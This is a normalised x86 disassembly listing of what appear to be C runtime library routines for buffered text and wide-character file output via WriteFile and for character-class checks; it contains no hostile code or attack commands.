mov eax [ edx * 4 + rw-data ]
or [ eax + ebx + 0x2d ] 0x4
inc [ esi + 0x4 ]
jmp r-xdata
push 0x2
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_434447
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc edi
jmp r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ esi + 0x8 ]
sub eax [ ebp - 0x30 ]
add eax edi
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x20 ] eax
jb r-xdata
cmp [ ebp - 0x1b ] 0xa
jne r-xdata
cmp edi [ ebp - 0x24 ]
jb r-xdata
push 0xd
pop eax
push 0x0
mov [ ebp - 0x1c ] ax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jb r-xdata
inc [ esi + 0x8 ]
inc [ esi + 0x4 ]
sub_43268f
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
add eax edi
mov [ ebp - 0x4 ] eax
cmp edi eax
jae r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx ebx [ edi ]
push ebx
call sub_43f736
pop ecx
cmp ax bx
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
add [ esi + 0x4 ] 0x2
cmp ebx 0xa
jne r-xdata
add edi 0x2
cmp edi [ ebp - 0x4 ]
jb r-xdata
push 0xd
pop ebx
push ebx
call sub_43f736
pop ecx
cmp ax bx
jne r-xdata
jmp r-xdata
inc [ esi + 0x4 ]
inc [ esi + 0x8 ]
sub_4326fc
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_43f216
pop ecx
test eax eax
jne r-xdata
push edi
mov edi esi
and esi 0x3f
sar edi 0x6
imul esi esi 0x30
mov eax [ edi * 4 + rw-data ]
test [ eax + esi + 0x28 ] 0x80
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
call sub_42fa1d
mov eax [ eax + 0x4c ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
pop edi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ edi * 4 + rw-data ]
push [ eax + esi + 0x18 ]
call [ GetConsoleMode@IAT ]
test eax eax
setne al
mov eax [ edi * 4 + rw-data ]
cmp [ eax + esi + 0x29 ] 0x0
jne r-xdata
sub_432772
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_40c3c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
and [ esi ] 0x0
add eax ebx
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
mov [ ebp - 0x1410 ] ecx
mov [ ebp - 0x1408 ] eax
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
push edi
lea eax [ ebp - 0x1404 ]
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ ebx ]
inc ebx
cmp al 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] al
lea eax [ ebp - 0x5 ]
inc edi
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
inc [ esi + 0x8 ]
mov [ edi ] 0xd
inc edi
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_432851
mov edi edi
push ebp
mov ebp esp
mov eax 0x1410
call sub_40c3c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx [ eax + ecx + 0x18 ]
mov eax [ ebp + 0x14 ]
add eax ebx
mov [ ebp - 0x1410 ] ecx
xor edx edx
mov [ ebp - 0x1408 ] eax
mov [ esi ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
cmp ebx eax
jb r-xdata
lea edi [ ebp - 0x1404 ]
jmp r-xdata
lea eax [ ebp - 0x1404 ]
sub edi eax
lea eax [ ebp - 0x140c ]
push 0x0
push eax
and edi 0xfffffffe
lea eax [ ebp - 0x1404 ]
push edi
push eax
push ecx
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ ebx ]
add ebx 0x2
cmp eax 0xa
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov [ esi ] eax
mov eax [ ebp - 0x140c ]
add [ esi + 0x4 ] eax
cmp eax edi
jb r-xdata
mov [ edi ] ax
lea eax [ ebp - 0x6 ]
add edi 0x2
cmp edi eax
mov eax [ ebp - 0x1408 ]
jb r-xdata
add [ esi + 0x8 ] 0x2
push 0xd
pop edx
mov [ edi ] dx
add edi 0x2
mov eax [ ebp - 0x1408 ]
mov ecx [ ebp - 0x1410 ]
cmp ebx eax
jae r-xdata
sub_43293f
mov edi edi
push ebp
mov ebp esp
mov eax 0x1418
call sub_40c3c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sar eax 0x6
and ecx 0x3f
imul ecx ecx 0x30
push ebx
push esi
mov eax [ eax * 4 + rw-data ]
xor ebx ebx
mov esi [ ebp + 0x8 ]
push edi
mov eax [ eax + ecx + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov edi ecx
mov [ ebp - 0x1414 ] eax
mov eax [ ebp + 0x14 ]
add eax ecx
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x140c ] eax
mov [ esi + 0x8 ] ebx
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x140c ]
lea eax [ ebp - 0x6b0 ]
push ebx
push ebx
push 0xd55
lea ecx [ ebp - 0x1408 ]
push ecx
lea ecx [ ebp - 0x6b0 ]
sub eax ecx
sar eax 0x1
push eax
mov eax ecx
push eax
push ebx
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1418 ] eax
test eax eax
je r-xdata
movzx ecx [ edi ]
add edi 0x2
cmp ecx 0xa
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi ] eax
push 0x0
lea ecx [ ebp - 0x1410 ]
sub eax ebx
push ecx
push eax
lea eax [ ebp - 0x1408 ]
add eax ebx
push eax
push [ ebp - 0x1414 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov [ eax ] cx
add eax 0x2
lea ecx [ ebp - 0x8 ]
cmp eax ecx
jb r-xdata
push 0xd
pop edx
mov [ eax ] dx
add eax 0x2
add ebx [ ebp - 0x1410 ]
mov eax [ ebp - 0x1418 ]
cmp ebx eax
jb r-xdata
cmp edi esi
jae r-xdata
mov eax edi
sub eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
cmp edi [ ebp - 0x140c ]
jae r-xdata
xor ebx ebx
jmp r-xdata
sub_432a6c
push 0x14
push r--data
call sub_40d260
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
jmp r-xdata
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x9
call sub_42fdcf
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x6
mov eax esi
and eax 0x3f
imul ecx eax 0x30
mov [ ebp - 0x20 ] ecx
mov eax [ ebx * 4 + rw-data ]
movzx eax [ eax + ecx + 0x28 ]
and eax 0x1
je r-xdata
push esi
call sub_43901e
pop ecx
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
test [ eax + ecx + 0x28 ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_432b57
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
and [ eax ] 0x0
jmp r-xdata
call sub_40d2a6
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_432b2e
mov eax edi
jmp r-xdata
sub_432b57
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x30 ] edi
test ecx ecx
jne r-xdata
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
mov eax esi
mov ebx esi
sar ebx 0x6
and eax 0x3f
imul edx eax 0x30
mov [ ebp - 0x1c ] ebx
mov eax [ ebx * 4 + rw-data ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x18 ] edx
mov bl [ eax + edx + 0x29 ]
cmp bl 0x2
je r-xdata
call sub_42fee2
and [ eax ] edi
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax ecx
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x2c ]
call sub_42fee2
and [ eax ] 0x0
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
jmp r-xdata
test [ eax + edx + 0x28 ] 0x20
je r-xdata
push esi
call sub_4326fc
pop ecx
test al al
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_43f625
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
test [ ecx + eax + 0x28 ] 0x80
je r-xdata
test bl bl
je r-xdata
pop ebx
mov eax [ ecx + eax + 0x18 ]
xor ecx ecx
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
lea ecx [ ebp - 0x10 ]
push ecx
push [ ebp - 0x8 ]
push edi
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
movsx eax bl
sub eax 0x0
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_4324dc
dec bl
cmp bl 0x1
ja r-xdata
lea esi [ ebp - 0x14 ]
call [ GetLastError@IAT ]
mov [ ebp - 0x14 ] eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_432772
jmp r-xdata
sub eax 0x1
je r-xdata
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx + 0x28 ] 0x40
je r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push eax
call sub_43268f
add esp 0xc
sub eax [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
add esp 0x10
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_43293f
jmp r-xdata
sub eax 0x1
jne r-xdata
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
call sub_42fef5
mov [ eax ] 0x1c
call sub_42fee2
and [ eax ] 0x0
cmp [ edi ] 0x1a
jne r-xdata
mov edi [ ebp - 0x30 ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x14 ]
push edi
push esi
push eax
call sub_432851
jmp r-xdata
xor eax eax
jmp r-xdata
push eax
call sub_42febf
pop ecx
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x9
call sub_42fee2
mov [ eax ] esi
jmp r-xdata
sub_432d63
mov edi edi
push ebp
mov ebp esp
push edi
push [ ebp + 0xc ]
call sub_432468
pop ecx
mov ecx [ ebp + 0xc ]
mov edi eax
mov ecx [ ecx + 0xc ]
test cl 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x9
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push 0x2
pop ebx
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0xc ]
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0x3
test al 0x1
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push ebx
call sub_432f89
pop ecx
pop ecx
test al al
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push 0x1
call sub_41730a
pop ecx
cmp esi eax
je r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
push 0xfffffffe
pop ecx
add eax 0xc
[ eax ] ecx
movzx eax bl
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
or eax 0xffffffff
jmp r-xdata
push edi
call sub_43f216
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_41730a
pop ecx
cmp esi eax
jne r-xdata
pop ebx
pop esi
push [ ebp + 0xc ]
call sub_43f77b
pop ecx
sub_432e74
mov edi edi
push ebp
mov ebp esp
push edi
push [ ebp + 0xc ]
call sub_432468
pop ecx
mov ecx [ ebp + 0xc ]
mov edi eax
mov ecx [ ecx + 0xc ]
test cl 0x6
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0xc
test al 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x9
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test al 0x1
je r-xdata
call sub_42fef5
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop ebp
retn
mov eax [ ebp + 0xc ]
push ebx
push esi
push 0x2
pop ebx
add eax 0xc
[ eax ] ebx
mov eax [ ebp + 0xc ]
push 0xfffffff7
pop ecx
add eax 0xc
[ eax ] ecx
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
test eax 0x4c0
jne r-xdata
mov eax [ ebp + 0xc ]
and [ eax + 0x8 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0xc ]
shr eax 0x3
test al 0x1
mov eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0xc ]
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push esi
call sub_433055
pop ecx
pop ecx
test al al
jne r-xdata
mov esi [ ebp + 0xc ]
push 0x1
call sub_41730a
pop ecx
cmp esi eax
je r-xdata
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov eax 0xffff
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
push 0xfffffffe
pop ecx
add eax 0xc
[ eax ] ecx
movzx eax si
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov eax 0xffff
jmp r-xdata
push edi
call sub_43f216
pop ecx
test eax eax
jne r-xdata
mov esi [ ebp + 0xc ]
push ebx
call sub_41730a
pop ecx
cmp esi eax
jne r-xdata
pop esi
pop ebx
push [ ebp + 0xc ]
call sub_43f77b
pop ecx
sub_432f89
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call sub_432468
pop ecx
mov ecx [ ebp + 0xc ]
mov edx eax
mov ecx [ ecx + 0xc ]
test cl 0xc0
je r-xdata
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push edx
call sub_432a6c
add esp 0xc
dec eax
neg eax
sbb eax eax
inc eax
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ecx + 0x4 ]
mov esi [ ecx ]
sub esi eax
inc eax
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
dec ecx
mov [ eax + 0x8 ] ecx
test esi esi
jle r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
push esi
push [ eax + 0x4 ]
push edx
call sub_432a6c
add esp 0xc
mov edi eax
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
cmp edi esi
sete al
jmp r-xdata
push 0x2
push edi
push edi
push edx
call sub_43f60a
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov al 0x1
jmp r-xdata
test [ eax + 0x28 ] 0x20
je r-xdata
sub_433055
mov edi edi
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call sub_432468
pop ecx
mov ecx [ ebp + 0xc ]
mov edx eax
mov ecx [ ecx + 0xc ]
test cl 0xc0
je r-xdata
push 0x2
lea eax [ ebp + 0x8 ]
push eax
push edx
call sub_432a6c
sub eax 0x2
add esp 0xc
neg eax
sbb eax eax
inc eax
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ecx + 0x4 ]
mov esi [ ecx ]
sub esi eax
add eax 0x2
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x18 ]
sub ecx 0x2
mov [ eax + 0x8 ] ecx
test esi esi
jle r-xdata
cmp edx 0xffffffff
je r-xdata
mov eax [ ebp + 0xc ]
push esi
push [ eax + 0x4 ]
push edx
call sub_432a6c
add esp 0xc
mov edi eax
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
mov ax [ ebp + 0x8 ]
mov [ ecx ] ax
xor eax eax
cmp edi esi
sete al
jmp r-xdata
push 0x2
push edi
push edi
push edx
call sub_43f60a
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
mov eax edx
mov ecx edx
and eax 0x3f
sar ecx 0x6
imul eax eax 0x30
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x10
pop ecx
add eax 0xc
[ eax ] ecx
mov al 0x1
jmp r-xdata
test [ eax + 0x28 ] 0x20
je r-xdata
sub_43314b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_432468
push eax
call sub_43f216
pop ecx
pop ecx
test eax eax
jne r-xdata
push ebx
push edi
push 0x1
call sub_41730a
pop ecx
push 0x2
pop ebx
cmp esi eax
jne r-xdata
xor al al
jmp r-xdata
push ebx
call sub_41730a
pop ecx
cmp esi eax
jne r-xdata
mov edi rw-data
jmp r-xdata
pop esi
pop ebp
retn
xor al al
mov edi rw-data
inc [ rw-data ]
lea ecx [ esi + 0xc ]
mov eax [ ecx ]
test eax 0x4c0
jne r-xdata
mov eax 0x282
[ ecx ] eax
mov eax [ edi ]
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
mov eax [ edi ]
mov [ esi ] eax
mov [ esi + 0x8 ] 0x1000
mov [ esi + 0x18 ] 0x1000
push 0x1000
call sub_42d0e4
push 0x0
mov [ edi ] eax
call sub_42d0aa
mov eax [ edi ]
pop ecx
pop ecx
test eax eax
jne r-xdata
pop edi
pop ebx
lea ecx [ esi + 0x14 ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov al 0x1
jmp r-xdata
sub_433200
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
lea edi [ esi + 0xc ]
mov eax [ edi ]
shr eax 0x9
test al 0x1
je r-xdata
pop edi
pop esi
push esi
call sub_43138b
pop ecx
mov eax 0xfffffd7f
[ edi ] eax
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
sub_433261
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
movzx eax bl
push eax
call sub_4335af
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
cmp bl 0x5f
jne r-xdata
pop ebx
pop ebp
retn
sub_433283
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4335de
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4332af
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4332ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433325
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push [ ebp + 0xc ]
call sub_41cb44
cmp [ ebp + 0x8 ] 0x9
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x40
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
push 0x40
pop eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_433368
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4333a0
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4332af
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4333c3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4332ea
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_4333e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43341e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x117
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433459
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433491
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x157
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4334cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x10
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433504
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43353c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_433574
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
lea eax [ ebp - 0xc ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_42f0a6
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_4335af
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
pop ebp
retn
push 0x0
